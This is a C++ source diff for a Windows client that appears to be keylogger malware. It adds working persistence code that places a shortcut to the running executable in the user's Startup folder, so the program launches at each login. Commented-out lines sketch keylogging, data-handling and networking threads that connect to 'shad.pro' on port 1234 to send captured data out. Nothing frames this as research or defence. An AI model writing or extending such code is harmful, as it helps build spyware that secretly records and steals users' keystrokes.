@@ -28,9 +28,9 @@ clientController::clientController(void) throw(DLibraryException)
 
 	if (!(this->libraries.handler.loadByName("infoClient")))
 		throw DLibraryException("infoClient", "Couldn't load module.");
-	Sleep(1);
 	if (!(this->infoClient = this->libraries.handler.getDictionaryByName("infoClient")))
 		throw DLibraryException("infoClient", "Couldn't get ClassInstance");
+	this->ifinstance = ((_getInstance)(*this->infoClient)["getInstance"])();
 }
 
 clientController::~clientController(void)
@@ -46,12 +46,19 @@ int		clientController::mainAction(int ac, char **av) {
 
 	// Dire bonjour
 	this->sayHelloAction();
-	ifinstance = ((_getInstance)(*this->infoClient)["getInstance"])();
-	std::cout << ifinstance->getOSType() << std::endl;
-	// Faire pleins de trucs ...
-	// ...
-
-	// Quitter
+	this->defineShortcut();
+	// Faire pleins de trucs :
+	// this->dhinstance->init();
+	// _lqueue = this->dhinstance->getLocaleQueue();
+	// this->netinstance->init("shad.pro", 1234);
+	// this->netinstance->auth(ifinstance->routine());
+	// this->dhinstance->setNetQueue(this->netinstance->getQueue());
+	//std::thread keylogging(klinstance->routine(_lqueue));
+	//std::thread datahandling(dhinstance->routine());
+	//std::thread networking(netinstance->routine());
+	// keylog.join();
+	// datahandling.join();
+	// networking.join();
 	return (0);
 }
 
@@ -59,4 +66,41 @@ void					clientController::sayHelloAction(void) {
 
 	((_sayHelloFrom)(*this->sayHello)["sayHelloFrom"])("client");
 
+}
+
+
+void	clientController::defineShortcut(void) {
+	LPCSTR module = new char[MAX_PATH];
+	if (GetModuleFileName(NULL, (LPSTR)module, MAX_PATH) != 0) {
+		PWSTR pszpath;
+		if (SHGetKnownFolderPath(FOLDERID_Startup, 0, NULL, &pszpath) == S_OK) {
+			std::wstring shortcut_path(pszpath);
+			shortcut_path += SHORTCUT_NAME;
+			CoTaskMemFree(pszpath);
+			if (PathFileExistsW((LPWSTR)shortcut_path.c_str()) == false)
+				createShortcut(module, shortcut_path.c_str(), DESCR);
+			return;
+		}
+	}
+}
+
+bool clientController::createShortcut(LPCSTR lpszPathObj, LPCWSTR lpszPathLink, LPCSTR descr) {
+	HRESULT hres;
+	IShellLink* psl;
+
+	CoInitializeEx(NULL, COINIT_MULTITHREADED);
+	hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&psl);
+	if (SUCCEEDED(hres)) {
+		IPersistFile* ppf;
+		psl->SetPath(lpszPathObj);
+		psl->SetDescription(descr);
+
+		hres = psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf);
+		if (SUCCEEDED(hres)) {
+			hres = ppf->Save(lpszPathLink, TRUE);
+			ppf->Release();
+		}
+		psl->Release();
+	}
+	return SUCCEEDED(hres);
 }
